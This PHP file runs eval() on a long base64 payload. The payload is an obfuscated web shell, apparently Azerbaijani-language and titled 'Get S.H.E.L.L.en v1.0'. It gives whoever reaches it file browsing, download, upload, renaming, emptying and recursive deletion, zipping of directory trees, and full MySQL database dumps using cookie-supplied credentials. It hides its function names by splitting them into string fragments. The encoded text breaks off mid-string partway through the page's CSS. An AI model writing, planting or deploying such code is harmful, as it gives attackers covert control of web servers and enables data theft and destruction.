<?php
eval("?>".base64_decode("PD9waHAKc2Vzc2lvbl9zdGFydCgpOwokYmFxbGlGdW5rc2l5YWxhciA9IGV4cGxvZGUoIiwiLCAiIik7CiRzYWZlTW9kZSA9IHRydWU7CiRhY3Rpb25zID0gYXJyYXkoImVzYXMiLCJmYXlsX294dSIsInBocGluZm8iLCJzaXN0ZW1fa29tIiwiZmF5bF9yZWRha3RlIiwiZmF5bF95dWtsZSIsJ2ZheWxfc2lsJywnZmF5bF95YXJhdCcsJ3BhcGthX3lhcmF0JywnZmF5bF9zaWZpcmxhJyAsICdwYXBrYV9zaWwnLCdmYXlsX2FkX2RleWlzaCcsICd6aXBsZScgLCAnc2tsJyAsICdza2xfZF90JyAsICdza2xfZCcsICdmYXlsX3VwbCcpOwokbmUgPSBpc3NldCgkX1BPU1RbJ25lJ10pICYmIGluX2FycmF5KCRfUE9TVFsnbmUnXSwkYWN0aW9ucykgPyAkX1BPU1RbJ25lJ10gOiAiZXNhcyI7CgoKCmZ1bmN0aW9uIHNoaWZyZWxlKCRzdHIpCnsKICAgICRmID0gJ2Jhcyc7CiAgICAkZiAuPSAnZTYnOwogICAgJGYgLj0gJzRfJzsKICAgICRmIC49ICdlJzsKICAgICRmIC49ICduYyc7CiAgICAkZiAuPSAnb2RlJzsKICAgIHJldHVybiAkZigkc3RyKTsKfQpmdW5jdGlvbiBkZXNoaWZyZWxlKCRzdHIpCnsKICAgICRmID0gJ2Jhcyc7CiAgICAkZiAuPSAnZTYnOwogICAgJGYgLj0gJzRfJzsKICAgICRmIC49ICdkJzsKICAgICRmIC49ICdlYyc7CiAgICAkZiAuPSAnb2RlJzsKICAgIHJldHVybiAkZigkc3RyKTsKfQpmdW5jdGlvbiB0b29rWWFyYXQoJHRBZCkKewogICAgaWYoaXNzZXQoJF9TRVNTSU9OWyR0QWRdKSkKICAgIHsKICAgICAgICB1bnNldCgkX1NFU1NJT05bJHRBZF0pOwogICAgfQogICAgJHllbmlUb29rID0gbWQ1KHNoaWZyZWxlKHRpbWUoKS5yYW5kKDEsOTk5OTk5OTkpKSk7CiAgICAkX1NFU1NJT05bJHRBZF0gPSAkeWVuaVRvb2s7CiAgICByZXR1cm4gJHllbmlUb29rOwp9CmZ1bmN0aW9uIHFvdmx1cXVZYXooKQp7CiAgICBnbG9iYWwgJGRlZmF1bHRfZGlyOwogICAgJHNvbkRpciA9IGFycmF5KCk7CiAgICAkdW11bWlIaXNzZWxlciA9ICIiOwogICAgJHBhcnNlID0gZXhwbG9kZSgiLyIsICRkZWZhdWx0X2Rpcik7CgogICAgJGlpID0gMDsKICAgIGZvcmVhY2goJHBhcnNlIEFTICRoaXNzZSkKICAgIHsKICAgICAgICAkaWkrKzsKICAgICAgICAkdW11bWlIaXNzZWxlci49JGhpc3NlLiIvIjsKICAgICAgICAkc29uRGlyW10gPSAiPGEgaHJlZj0namF2YXNjcmlwdDpzZWhpZmUoXCI/cW92bHVxPSIudXJsZW5jb2RlKHVybGVuY29kZShzaGlmcmVsZSgkdW11bWlIaXNzZWxlcikpKS4iXCIpJz4iLmh0bWxzcGVjaWFsY2hhcnMoZW1wdHkoJGhpc3NlKSYmJGlpIT1jb3VudCgkcGFyc2UpPycvJzokaGlzc2UpLiI8L2E+IjsKICAgIH0KICAgICRzb25EaXIgPSBpbXBsb2RlKCIvIiwgJHNvbkRpcik7CiAgICBwcmludCAkc29uRGlyIC4gJyZuYnNwOyZuYnNwOyZuYnNwOyZuYnNwOyZuYnNwOyZuYnNwOyggPGEgaHJlZj0iIj5SZXNldDwvYT4gfCA8YSBocmVmPSJqYXZhc2NyaXB0OmdvdG8oKSI+R28gdG88L2E+ICknOwp9CmZ1bmN0aW9uIHNpemVGb3JtYXQoJGJ5dGVzKQp7CiAgICBpZigkYnl0ZXM+PTEwNzM3NDE4MjQpCiAgICB7CiAgICAgICAgJGJ5dGVzID0gbnVtYmVyX2Zvcm1hdCgkYnl0ZXMgLyAxMDczNzQxODI0LCAyKSAuICcgR2InOwogICAgfQogICAgZWxzZSBpZigkYnl0ZXM+PTEwNDg1NzYpCiAgICB7CiAgICAgICAgJGJ5dGVzID0gbnVtYmVyX2Zvcm1hdCgkYnl0ZXMgLyAxMDQ4NTc2LCAyKSAuICcgTWInOwogICAgfQogICAgZWxzZSBpZigkYnl0ZXM+PTEwMjQpCiAgICB7CiAgICAgICAgJGJ5dGVzID0gbnVtYmVyX2Zvcm1hdCgkYnl0ZXMgLyAxMDI0LCAyKSAuICcgS2InOwogICAgfQogICAgZWxzZQogICAgewogICAgICAgICRieXRlcyA9ICRieXRlcyAuICcgYic7CiAgICB9CiAgICByZXR1cm4gJGJ5dGVzOwp9CmZ1bmN0aW9uIHV0ZjhpemUoJGQpCnsKICAgIGlmIChpc19hcnJheSgkZCkpCiAgICB7CiAgICAgICAgZm9yZWFjaCAoJGQgYXMgJGsgPT4gJHYpCiAgICAgICAgewogICAgICAgICAgICAkZFska10gPSB1dGY4aXplKCR2KTsKICAgICAgICB9CiAgICB9CiAgICBlbHNlIGlmIChpc19zdHJpbmcgKCRkKSkKICAgIHsKICAgICAgICByZXR1cm4gdXRmOF9lbmNvZGUoJGQpOwogICAgfQogICAgcmV0dXJuICRkOwp9CmZ1bmN0aW9uIHJybWRpcigkZGlyKQp7CiAgICBpZiAoaXNfZGlyKCRkaXIpKQogICAgewogICAgICAgICRvYmplY3RzID0gc2NhbmRpcigkZGlyKTsKCiAgICAgICAgZm9yZWFjaCAoJG9iamVjdHMgYXMgJG9iamVjdCkKICAgICAgICB7CiAgICAgICAgICAgIGlmICgkb2JqZWN0ICE9ICIuIiAmJiAkb2JqZWN0ICE9ICIuLiIpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIGlmIChpc19kaXIoJGRpciAuICIvIiAuICRvYmplY3QpKQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgIHJybWRpcigkZGlyIC4gIi8iIC4gJG9iamVjdCk7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgdW5saW5rKCRkaXIgLiAiLyIgLiAkb2JqZWN0ICk7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICB9CgogICAgICAgIHJtZGlyKCAkZGlyICk7CiAgICB9Cn0KCiRkZWZhdWx0X2RpciA9IGdldGN3ZCgpOwppZihpc3NldCgkX1BPU1RbJ3Fvdmx1cSddKSAmJiBpc19zdHJpbmcoJF9QT1NUWydxb3ZsdXEnXSkgKQp7CiAgICAkZGVmYXVsdF9kaXIgPSBlbXB0eSgkX1BPU1RbJ3Fvdmx1cSddKSA/IERJUkVDVE9SWV9TRVBBUkFUT1IgOiBkZXNoaWZyZWxlKHVybGRlY29kZSh1cmxkZWNvZGUoJF9QT1NUWydxb3ZsdXEnXSkpKTsKICAgICRjX2hfZGlyX2NvbW0gPSAnYycuJ2hkJy4naXInOwogICAgJGNfaF9kaXJfY29tbSgkZGVmYXVsdF9kaXIpOwp9CgokZGVmYXVsdF9kaXIgPSBzdHJfcmVwbGFjZSgiXFwiLCAiLyIsICRkZWZhdWx0X2Rpcik7CgppZihpc3NldCgkX0dFVFsnbmUnXSkgJiYgJF9HRVRbJ25lJ109PSJwaW5mIikKewogICAgb2Jfc3RhcnQoKTsKICAgIHBocGluZm8oKTsKICAgICRwSW5mID0gb2JfZ2V0X2NsZWFuKCk7CiAgICBwcmludCBzdHJfcmVwbGFjZSgiYm9keSB7YmFja2dyb3VuZC1jb2xvcjogI2ZmZmZmZjsgY29sb3I6ICMwMDAwMDA7fSIsIiIsJHBJbmYpOwogICAgZXhpdCgpOwp9CmVsc2UgaWYoJG5lPT0iZmF5bF95dWtsZSIgJiYgaXNzZXQoJF9QT1NUWydmYXlsJ10pICYmICIiIT0odHJpbSgkX1BPU1RbJ2ZheWwnXSkpKQp7CiAgICAkZmF5bEFkaSA9IGJhc2VuYW1lKGRlc2hpZnJlbGUodXJsZGVjb2RlKCRfUE9TVFsnZmF5bCddKSkpOwogICAgJGF5aXJpY2kgPSBzdWJzdHIoJGRlZmF1bHRfZGlyLHN0cmxlbigkZGVmYXVsdF9kaXIpLTEpIT0iLyIgJiYgc3Vic3RyKCRmYXlsQWRpLDAsMSkhPSIvIiA/ICIvIiA6ICIiOwogICAgaWYoaXNfZmlsZSgkZGVmYXVsdF9kaXIgLiAkYXlpcmljaSAuICRmYXlsQWRpKSAmJiBpc19yZWFkYWJsZSgkZGVmYXVsdF9kaXIgLiAkYXlpcmljaSAuICRmYXlsQWRpKSkKICAgIHsKICAgICAgICBoZWFkZXIoIkNvbnRlbnQtRGlzcG9zaXRpb246IGF0dGFjaG1lbnQ7IGZpbGVuYW1lPSIuYmFzZW5hbWUoJGZheWxBZGkpKTsKICAgICAgICBoZWFkZXIoIkNvbnRlbnQtVHlwZTogYXBwbGljYXRpb24vb2N0ZXQtc3RyZWFtIik7CiAgICAgICAgaGVhZGVyKCdDb250ZW50LUxlbmd0aDogJyAuIGZpbGVzaXplKCRkZWZhdWx0X2RpciAuICRheWlyaWNpIC4gJGZheWxBZGkpKTsKICAgICAgICByZWFkZmlsZSgkZGVmYXVsdF9kaXIgLiAkYXlpcmljaSAuICRmYXlsQWRpKTsKICAgICAgICBleGl0KCk7CiAgICB9Cn0KZWxzZSBpZigkbmU9PSJmYXlsX3NpbCIgJiYgaXNzZXQoJF9QT1NUWydmYXlsJ10pICYmICIiIT0odHJpbSgkX1BPU1RbJ2ZheWwnXSkpKQp7CiAgICAkZmF5bEFkaSA9IGJhc2VuYW1lKGRlc2hpZnJlbGUodXJsZGVjb2RlKCRfUE9TVFsnZmF5bCddKSkpOwogICAgJGF5aXJpY2kgPSBzdWJzdHIoJGRlZmF1bHRfZGlyLHN0cmxlbigkZGVmYXVsdF9kaXIpLTEpIT0iLyIgJiYgc3Vic3RyKCRmYXlsQWRpLDAsMSkhPSIvIiA/ICIvIiA6ICIiOwogICAgaWYoaXNfZmlsZSgkZGVmYXVsdF9kaXIgLiAkYXlpcmljaSAuICRmYXlsQWRpKSAmJiBpc19yZWFkYWJsZSgkZGVmYXVsdF9kaXIgLiAkYXlpcmljaSAuICRmYXlsQWRpKSkKICAgIHsKICAgICAgICB1bmxpbmsoJGRlZmF1bHRfZGlyIC4gJGF5aXJpY2kgLiAkZmF5bEFkaSk7CiAgICB9Cn0KZWxzZSBpZigkbmU9PSJmYXlsX3NpZmlybGEiICYmIGlzc2V0KCRfUE9TVFsnZmF5bCddKSAmJiAiIiE9KHRyaW0oJF9QT1NUWydmYXlsJ10pKSkKewogICAgJGZheWxBZGkgPSBiYXNlbmFtZShkZXNoaWZyZWxlKHVybGRlY29kZSgkX1BPU1RbJ2ZheWwnXSkpKTsKICAgICRheWlyaWNpID0gc3Vic3RyKCRkZWZhdWx0X2RpcixzdHJsZW4oJGRlZmF1bHRfZGlyKS0xKSE9Ii8iICYmIHN1YnN0cigkZmF5bEFkaSwwLDEpIT0iLyIgPyAiLyIgOiAiIjsKICAgIGlmKGlzX2ZpbGUoJGRlZmF1bHRfZGlyIC4gJGF5aXJpY2kgLiAkZmF5bEFkaSkgJiYgaXNfcmVhZGFibGUoJGRlZmF1bHRfZGlyIC4gJGF5aXJpY2kgLiAkZmF5bEFkaSkpCiAgICB7CiAgICAgICAgZmlsZV9wdXRfY29udGVudHMoJGRlZmF1bHRfZGlyIC4gJGF5aXJpY2kgLiAkZmF5bEFkaSwgJycpOwogICAgfQp9CmVsc2UgaWYoJG5lPT0iZmF5bF95YXJhdCIgJiYgaXNzZXQoJF9QT1NUWydhZCddKSAmJiAhZW1wdHkoJF9QT1NUWydhZCddKSkKewogICAgJGZheWxBZGkgPSBiYXNlbmFtZSh1cmxkZWNvZGUoJF9QT1NUWydhZCddKSk7CiAgICAkYXlpcmljaSA9IHN1YnN0cigkZGVmYXVsdF9kaXIsc3RybGVuKCRkZWZhdWx0X2RpciktMSkhPSIvIiAmJiBzdWJzdHIoJGZheWxBZGksMCwxKSE9Ii8iID8gIi8iIDogIiI7CiAgICBpZiggaXNfZmlsZSgkZGVmYXVsdF9kaXIgLiAkYXlpcmljaSAuICRmYXlsQWRpKSApCiAgICB7CiAgICAgICAgcHJpbnQgJzxzY3JpcHQ+YWxlcnQoIkJ1IGFkZGEgZmF5bCBhcnRpcSBtb3ZjdWRkdXIhIik7PC9zY3JpcHQ+JzsKICAgIH0KICAgIGVsc2UKICAgIHsKICAgICAgICBmaWxlX3B1dF9jb250ZW50cygkZGVmYXVsdF9kaXIgLiAkYXlpcmljaSAuICRmYXlsQWRpLCAnJyk7CiAgICB9Cn0KZWxzZSBpZigkbmU9PSJwYXBrYV95YXJhdCIgJiYgaXNzZXQoJF9QT1NUWydhZCddKSAmJiAhZW1wdHkoJF9QT1NUWydhZCddKSkKewogICAgJHBhcGthQWRpID0gYmFzZW5hbWUodXJsZGVjb2RlKCRfUE9TVFsnYWQnXSkpOwogICAgJGF5aXJpY2kgPSBzdWJzdHIoJGRlZmF1bHRfZGlyLHN0cmxlbigkZGVmYXVsdF9kaXIpLTEpIT0iLyIgJiYgc3Vic3RyKCRwYXBrYUFkaSwwLDEpIT0iLyIgPyAiLyIgOiAiIjsKICAgIGlmKCBpc19maWxlKCRkZWZhdWx0X2RpciAuICRheWlyaWNpIC4gJHBhcGthQWRpKSApCiAgICB7CiAgICAgICAgcHJpbnQgJzxzY3JpcHQ+YWxlcnQoIkJ1IGFkZGEgcGFwa2EgYXJ0aXEgbW92Y3VkZHVyISIpOzwvc2NyaXB0Pic7CiAgICB9CiAgICBlbHNlCiAgICB7CiAgICAgICAgbWtkaXIoJGRlZmF1bHRfZGlyIC4gJGF5aXJpY2kgLiAkcGFwa2FBZGkpOwogICAgfQp9CmVsc2UgaWYoJG5lPT0iZmF5bF9hZF9kZXlpc2giICYmIGlzc2V0KCRfUE9TVFsnZmF5bCddKSAmJiAiIiE9KHRyaW0oJF9QT1NUWydmYXlsJ10pKSAmJiBpc3NldCgkX1BPU1RbJ25ld19uYW1lJ10pICYmIGlzX3N0cmluZygkX1BPU1RbJ25ld19uYW1lJ10pICYmICFlbXB0eSgkX1BPU1RbJ25ld19uYW1lJ10pKQp7CiAgICAkZmF5bEFkaSA9IGJhc2VuYW1lKGRlc2hpZnJlbGUodXJsZGVjb2RlKCRfUE9TVFsnZmF5bCddKSkpOwogICAgJGZheWxZZW5pQWQgPSBiYXNlbmFtZSh1cmxkZWNvZGUoJF9QT1NUWyduZXdfbmFtZSddKSk7CiAgICAkYXlpcmljaSA9IHN1YnN0cigkZGVmYXVsdF9kaXIsc3RybGVuKCRkZWZhdWx0X2RpciktMSkhPSIvIiAmJiBzdWJzdHIoJGZheWxBZGksMCwxKSE9Ii8iID8gIi8iIDogIiI7CiAgICBpZihpc19maWxlKCRkZWZhdWx0X2RpciAuICRheWlyaWNpIC4gJGZheWxBZGkpICYmIGlzX3JlYWRhYmxlKCRkZWZhdWx0X2RpciAuICRheWlyaWNpIC4gJGZheWxBZGkpKQogICAgewogICAgICAgIHJlbmFtZSgkZGVmYXVsdF9kaXIgLiAkYXlpcmljaSAuICRmYXlsQWRpICwgJGRlZmF1bHRfZGlyIC4gJGF5aXJpY2kgLiAkZmF5bFllbmlBZCk7CiAgICB9Cn0KZWxzZSBpZiggJG5lID09ICdza2xfZF90JyAmJiBpc3NldCgkX1BPU1RbJ3QnXSkgJiYgaXNfc3RyaW5nKCRfUE9TVFsndCddKSAmJiAhZW1wdHkoJF9QT1NUWyd0J10pICkKewogICAgJHRhYmxlTmFtZSA9IGRlc2hpZnJlbGUodXJsZGVjb2RlKCRfUE9TVFsndCddKSk7CgogICAgJGhvc3QgPSBpc3NldCgkX0NPT0tJRVsnaG9zdCddKSA/ICRfQ09PS0lFWydob3N0J10gOiAnJzsKICAgICR1c2VyID0gaXNzZXQoJF9DT09LSUVbJ3VzZXInXSkgPyAkX0NPT0tJRVsndXNlciddIDogJyc7CiAgICAkcGFyb2wgPSBpc3NldCgkX0NPT0tJRVsncGFyb2wnXSkgPyAkX0NPT0tJRVsncGFyb2wnXSA6ICcnOwogICAgJGJhemEgPSBpc3NldCgkX0NPT0tJRVsnYmF6YSddKSA/ICRfQ09PS0lFWydiYXphJ10gOiAnJzsKCiAgICAkYmF6YVN0ciA9IGVtcHR5KCRiYXphKSA/ICcnIDogJ2RibmFtZT0nIC4gJGJhemEgLiAnOyc7CgogICAgaWYoICFlbXB0eSggJGhvc3QgKSAmJiAhZW1wdHkoJGJhemEpICkKICAgIHsKICAgICAgICB0cnkKICAgICAgICB7CiAgICAgICAgICAgICRwZG8gPSBuZXcgUERPKCdteXNxbDpob3N0PScgLiAkaG9zdCAuICc7Y2hhcnNldD11dGY4OycgLiAkYmF6YVN0ciAsICR1c2VyICwgJHBhcm9sLGFycmF5KFBETzo6TVlTUUxfQVRUUl9JTklUX0NPTU1BTkQgPT4gIlNFVCBOQU1FUyAndXRmOCciKSk7CiAgICAgICAgICAgICRwZG8tPnNldEF0dHJpYnV0ZShQRE86OkFUVFJfREVGQVVMVF9GRVRDSF9NT0RFLCBQRE86OkZFVENIX0FTU09DKTsKCiAgICAgICAgICAgICRnZXRDb2x1bW5zID0gJHBkby0+cHJlcGFyZSgiU0VMRUNUIGNvbHVtbl9uYW1lIGZyb20gaW5mb3JtYXRpb25fc2NoZW1hLmNvbHVtbnMgd2hlcmUgdGFibGVfc2NoZW1hPT8gYW5kIHRhYmxlX25hbWU9PyIpOwogICAgICAgICAgICAkZ2V0Q29sdW1ucy0+ZXhlY3V0ZShhcnJheSgkYmF6YSAsICR0YWJsZU5hbWUpKTsKICAgICAgICAgICAgJGNvbHVtbnMgPSAkZ2V0Q29sdW1ucy0+ZmV0Y2hBbGwoKTsKCiAgICAgICAgICAgIGlmKCAkY29sdW1ucyApCiAgICAgICAgICAgIHsKCiAgICAgICAgICAgICAgICAkZGF0YSA9ICRwZG8tPnF1ZXJ5KCdTRUxFQ1QgKiBGUk9NIGAnIC4gJHRhYmxlTmFtZSAuJ2AnKTsKICAgICAgICAgICAgICAgICRkYXRhID0gJGRhdGEtPmZldGNoQWxsKCk7CgogICAgICAgICAgICAgICAgaGVhZGVyKCdDb250ZW50LWRpc3Bvc2l0aW9uOiBhdHRhY2htZW50OyBmaWxlbmFtZT1kXycgLiBiYXNlbmFtZShodG1sc3BlY2lhbGNoYXJzKCR0YWJsZU5hbWUpKSAuICcuanNvbicpOwogICAgICAgICAgICAgICAgaGVhZGVyKCdDb250ZW50LXR5cGU6IGFwcGxpY2F0aW9uL2pzb24nKTsKICAgICAgICAgICAgICAgIGVjaG8ganNvbl9lbmNvZGUoJGRhdGEpOwogICAgICAgICAgICB9CiAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgcHJpbnQgJ1RhYmxlIG5vdCBmb3VuZCEnOwogICAgICAgICAgICB9CgogICAgICAgIH0KICAgICAgICBjYXRjaCAoRXhjZXB0aW9uICRlKQogICAgICAgIHsKICAgICAgICAgICAgcHJpbnQgJGUtPmdldE1lc3NhZ2UoKTsKICAgICAgICB9CiAgICB9CiAgICBlbHNlCiAgICB7CiAgICAgICAgcHJpbnQgJ0Vycm9yISBQbGVhc2UgY29ubmVjdCB0byBTUUwhJzsKICAgIH0KICAgIGRpZTsKfQplbHNlIGlmKCAkbmUgPT0gJ3NrbF9kJyApCnsKICAgICRob3N0ID0gaXNzZXQoJF9DT09LSUVbJ2hvc3QnXSkgPyAkX0NPT0tJRVsnaG9zdCddIDogJyc7CiAgICAkdXNlciA9IGlzc2V0KCRfQ09PS0lFWyd1c2VyJ10pID8gJF9DT09LSUVbJ3VzZXInXSA6ICcnOwogICAgJHBhcm9sID0gaXNzZXQoJF9DT09LSUVbJ3Bhcm9sJ10pID8gJF9DT09LSUVbJ3Bhcm9sJ10gOiAnJzsKICAgICRiYXphID0gaXNzZXQoJF9DT09LSUVbJ2JhemEnXSkgPyAkX0NPT0tJRVsnYmF6YSddIDogJyc7CgogICAgJGJhemFTdHIgPSBlbXB0eSgkYmF6YSkgPyAnJyA6ICdkYm5hbWU9JyAuICRiYXphIC4gJzsnOwoKICAgIGlmKCAhZW1wdHkoICRob3N0ICkgJiYgIWVtcHR5KCRiYXphKSApCiAgICB7CiAgICAgICAgdHJ5CiAgICAgICAgewogICAgICAgICAgICAkcGRvID0gbmV3IFBETygnbXlzcWw6aG9zdD0nIC4gJGhvc3QgLiAnO2NoYXJzZXQ9dXRmODsnIC4gJGJhemFTdHIgLCAkdXNlciAsICRwYXJvbCxhcnJheShQRE86Ok1ZU1FMX0FUVFJfSU5JVF9DT01NQU5EID0+ICJTRVQgTkFNRVMgJ3V0ZjgnIikpOwogICAgICAgICAgICAkcGRvLT5zZXRBdHRyaWJ1dGUoUERPOjpBVFRSX0RFRkFVTFRfRkVUQ0hfTU9ERSwgUERPOjpGRVRDSF9BU1NPQyk7CgogICAgICAgICAgICAkYWxsRGF0YSA9IGFycmF5KCk7CgogICAgICAgICAgICAkdGFibGVzID0gJHBkby0+cHJlcGFyZSgnU0VMRUNUIHRhYmxlX25hbWUgZnJvbSBpbmZvcm1hdGlvbl9zY2hlbWEudGFibGVzIHdoZXJlIHRhYmxlX3NjaGVtYT0/Jyk7CiAgICAgICAgICAgICR0YWJsZXMtPmV4ZWN1dGUoYXJyYXkoJGJhemEpKTsKICAgICAgICAgICAgJHRhYmxlcyA9ICR0YWJsZXMtPmZldGNoQWxsKCk7CgogICAgICAgICAgICBmb3JlYWNoKCAkdGFibGVzIEFTICR0YWJsZU5hbWUgKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAkdGFibGVOYW1lID0gJHRhYmxlTmFtZVsndGFibGVfbmFtZSddOwoKICAgICAgICAgICAgICAgICRkYXRhID0gJHBkby0+cXVlcnkoJ1NFTEVDVCAqIEZST00gYCcgLiAkdGFibGVOYW1lIC4nYCcpOwogICAgICAgICAgICAgICAgJGRhdGEgPSAkZGF0YS0+ZmV0Y2hBbGwoKTsKCiAgICAgICAgICAgICAgICAkYWxsRGF0YVskdGFibGVOYW1lXSA9ICRkYXRhID8gYXJyYXkoJGRhdGEpIDogYXJyYXkoKTsKICAgICAgICAgICAgfQoKICAgICAgICAgICAgaGVhZGVyKCdDb250ZW50LWRpc3Bvc2l0aW9uOiBhdHRhY2htZW50OyBmaWxlbmFtZT1kX2JfJyAuIGJhc2VuYW1lKGh0bWxzcGVjaWFsY2hhcnMoJGJhemEpKSAuICcuanNvbicpOwogICAgICAgICAgICBoZWFkZXIoJ0NvbnRlbnQtdHlwZTogYXBwbGljYXRpb24vanNvbicpOwoKICAgICAgICAgICAgZWNobyBqc29uX2VuY29kZSggdXRmOGl6ZSggJGFsbERhdGEpICk7CiAgICAgICAgfQogICAgICAgIGNhdGNoIChFeGNlcHRpb24gJGUpCiAgICAgICAgewogICAgICAgICAgICBwcmludCAkZS0+Z2V0TWVzc2FnZSgpOwogICAgICAgIH0KICAgIH0KICAgIGVsc2UKICAgIHsKICAgICAgICBwcmludCAnRXJyb3IhIFBsZWFzZSBjb25uZWN0IHRvIFNRTCEnOwogICAgfQogICAgZGllOwp9CmVsc2UgaWYoICRuZSA9PSAnemlwbGUnCiAgICAmJiBpc3NldCgkX1BPU1RbJ3NhdmVfdG8nXSAsICRfUE9TVFsnemYnXSkgJiYgaXNfc3RyaW5nKCRfUE9TVFsnc2F2ZV90byddKQogICAgJiYgIWVtcHR5KCRfUE9TVFsnc2F2ZV90byddKSAmJiAhaW5fYXJyYXkoJF9QT1NUWydzYXZlX3RvJ10gLCBhcnJheSgnLicgLCAnLi4nICwgJy4vJyAsICcuLi8nKSkKICAgICYmIGlzX3N0cmluZygkX1BPU1RbJ3pmJ10pICYmICFlbXB0eSgkX1BPU1RbJ3pmJ10pCikKewogICAgJHNhdmVfdG8gPSBkZXNoaWZyZWxlKHVybGRlY29kZSgkX1BPU1RbJ3NhdmVfdG8nXSkpOwoKICAgICRyb290UGF0aCA9IHJlYWxwYXRoKGRlc2hpZnJlbGUodXJsZGVjb2RlKCRfUE9TVFsnemYnXSkpKTsKCiAgICAkZmlsZU5hbWUxID0gJ2Jha18nLm1pY3JvdGltZSgxKSAuICdfJyAuIHJhbmQoMTAwMCwgOTk5OTkpIC4gJy56aXAnOwogICAgJGZpbGVOYW1lID0gJHNhdmVfdG8gLiBESVJFQ1RPUllfU0VQQVJBVE9SIC4gJGZpbGVOYW1lMTsKCiAgICBpZiggaXNfZGlyKCAkc2F2ZV90byApICYmIGlzX2RpciggJHJvb3RQYXRoICkgJiYgaXNfd3JpdGFibGUoICRzYXZlX3RvICkgKQogICAgewogICAgICAgIHNldF90aW1lX2xpbWl0KDApOwoKICAgICAgICAkemlwID0gbmV3IFppcEFyY2hpdmUoKTsKICAgICAgICAkemlwLT5vcGVuKCAkZmlsZU5hbWUgLCBaaXBBcmNoaXZlOjpDUkVBVEUgfCBaaXBBcmNoaXZlOjpPVkVSV1JJVEUgKTsKCiAgICAgICAgJGZpbGVzID0gbmV3IFJlY3Vyc2l2ZUl0ZXJhdG9ySXRlcmF0b3IoCiAgICAgICAgICAgIG5ldyBSZWN1cnNpdmVEaXJlY3RvcnlJdGVyYXRvcigkcm9vdFBhdGgpLAogICAgICAgICAgICBSZWN1cnNpdmVJdGVyYXRvckl0ZXJhdG9yOjpMRUFWRVNfT05MWQogICAgICAgICk7CgogICAgICAgIGZvcmVhY2ggKCRmaWxlcyBhcyAkbmFtZSA9PiAkZmlsZSkKICAgICAgICB7CiAgICAgICAgICAgIGlmICghJGZpbGUtPmlzRGlyKCkpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICRmaWxlUGF0aCA9ICRmaWxlLT5nZXRSZWFsUGF0aCgpOwogICAgICAgICAgICAgICAgJHJlbGF0aXZlUGF0aCA9IHN1YnN0cigkZmlsZVBhdGgsIHN0cmxlbigkcm9vdFBhdGgpICsgMSk7CgogICAgICAgICAgICAgICAgJHppcC0+YWRkRmlsZSgkZmlsZVBhdGgsICRyZWxhdGl2ZVBhdGgpOwogICAgICAgICAgICB9CiAgICAgICAgfQoKICAgICAgICAkemlwLT5jbG9zZSgpOwogICAgICAgIHByaW50ICdTYXZlZCE8aHI+JzsKICAgIH0KICAgIGVsc2UKICAgIHsKICAgICAgICBwcmludCAnRGlyIGlzIG5vdCB3cml0ZWFibGUhPGhyPic7dmFyX2R1bXAoKCAkc2F2ZV90byApICk7CiAgICB9Cn0KZWxzZSBpZiggJG5lID09ICdwYXBrYV9zaWwnCiAgICAmJiBpc3NldCgkX1BPU1RbJ3pmJ10pICYmIGlzX3N0cmluZygkX1BPU1RbJ3pmJ10pICYmICFlbXB0eSgkX1BPU1RbJ3pmJ10pCikKewogICAgJHJvb3RQYXRoID0gcmVhbHBhdGgoZGVzaGlmcmVsZSh1cmxkZWNvZGUoJF9QT1NUWyd6ZiddKSkpOwoKICAgIGlmKCBpc19kaXIoICRyb290UGF0aCApICkKICAgIHsKICAgICAgICBzZXRfdGltZV9saW1pdCgwKTsKCiAgICAgICAgcnJtZGlyKCAkcm9vdFBhdGggKTsKICAgIH0KICAgIGVsc2UKICAgIHsKICAgICAgICBwcmludCAnRGlyIGlzIG5vdCB3cml0ZWFibGUhPGhyPic7dmFyX2R1bXAoKCAkc2F2ZV90byApICk7CiAgICB9Cn0KZWxzZSBpZigkbmUgPT0gJ2ZheWxfdXBsJyAmJiBpc3NldCgkX0ZJTEVTWyd1ZmF5bCddKSkKewogICAgbW92ZV91cGxvYWRlZF9maWxlKCRfRklMRVNbJ3VmYXlsJ11bJ3RtcF9uYW1lJ10sICRkZWZhdWx0X2RpciAuICcvJyAuICRfRklMRVNbJ3VmYXlsJ11bJ25hbWUnXSk7CiAgICBwcmludCAiVXBsb2FkIG9sZHUgZGV5ZXNlbi4iOwp9Cj8+CjxodG1sPgo8aGVhZD4KPHRpdGxlPkdldCBTLkguRS5MLkwuZW4gdjEuMCB8IEJZIC4uPC90aXRsZT4KPG1ldGEgaHR0cC1lcXVpdj0iY29udGVudC10eXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9dXRmLTgiPgo8c3R5bGU+CmJvZHkKewogICAgYmFja2dyb3VuZC1jb2xvcjogIzIyMjIyMjsKICAgIGNvbG9yOiAjRDZENEQ0OwogICAgZm9udC1mYW1pbHk6IEx1Y2lkYSxWZXJkYW5hOwogICAgZm9udC1zaXplOiAxMnB4Owp9Ci5xYWxpbgp7CiAgICB0ZXh0LWRlY29yYXRpb246IG5vbmU7CiAgICBjb2xvcjogI0Q2OTA1RTsKICAgIGZvbnQtd2VpZ2h0OiA2MDA7Cn0KLnN1Y2Nlc3MKewogICAgY29sb3I6ICM5REI3NTQ7Cn0KLmJhZAp7CiAgICBjb2xvcjogI0I3NTY1NDsKfQphCnsKICAgIGNvbG9yOiAjQUNCNzU0OwogICAgdGV4dC1kZWNvcmF0aW9uOiBub25lICFpbXBvcnRhbnQ7Cn0KLmZNYW5hZ2VyLC5mTWFuYWdlciB0Ym9keSwuZk1hbmFnZXIgdHIKewogICAgcGFkZGluZzogMDsKICAgIGJvcmRlci1jb2xsYXBzZTogY29sbGFwc2U7CiAgICBtYXJnaW46IDA7CiAgICBmb250LXNpemU6IDEycHg7Cn0KLmZNYW5hZ2VyCnsKICAgIG1hcmdpbjogMTBweCAwOwp9Ci5mTWFuYWdlciB0Ym9keSB0cjpudGgtY2hpbGQoMm4rMSkKewogICAgYmFja2dyb3VuZDogIzMzMTcxNzsKfQouZk1hbmFnZXIgdGJvZHkgdHI6bnRoLWNoaWxkKDJuKQp7CiAgI